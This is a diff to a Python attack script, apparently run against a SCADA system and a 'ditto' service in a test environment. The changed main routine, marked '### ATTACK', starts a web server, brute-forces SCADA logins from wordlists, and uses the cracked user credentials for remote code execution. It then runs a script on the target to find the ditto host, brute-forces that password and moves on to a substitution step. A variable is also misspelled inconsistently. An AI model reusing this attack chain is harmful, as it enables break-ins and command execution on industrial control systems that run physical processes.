@@ -12,7 +12,7 @@ substitute_in_file('scripts/substitute_host.sh', {'this_ip': this_ip})
 ip_ditto = None
 last_data_ditto = {}
 
-credientials_scada = []
+credientials_scada_admin, credientials_scada_user = [], []
 password_ditto = None
 
 scanner = nmap.PortScanner()
@@ -74,18 +74,18 @@ def route_simulation(thing_id):
 
 if __name__ == "__main__":
     ### WEBSERVER
-    if True:
-        webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', 80))
-        webserverThread.start()
+    webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', 80))
+    webserverThread.start()
 
-    credientials_scada = bruteforce_password_scada(scada_url, 'wordlist/usernames.txt', 'wordlist/passwords.txt')   
-    while len(credientials_scada) == 0:
+
+    ### ATTACK
+    credentials_scada_admin, credientials_scada_user = bruteforce_password_scada(scada_url, 'wordlist/usernames.txt', 'wordlist/passwords.txt')   
+    while len(credientials_scada_user) == 0:
         time.sleep(10)
-    rce = RCE(scada_url, credientials_scada[1][0], credientials_scada[1][1], this_ip)
+    rce = RCE(scada_url, credientials_scada_user[0][0], credientials_scada_user[0][1], this_ip)
     rce.execute_script('fetch_ip_ditto.sh')
     bruteforce_password_ditto(scada_url, rce, 'wordlist/passwords.txt')
     print("End bruteforce ditto", flush=True)
-    print(password_ditto, flush=True)
     while password_ditto is None:
         time.sleep(10)
     print("Substituting", flush=True)
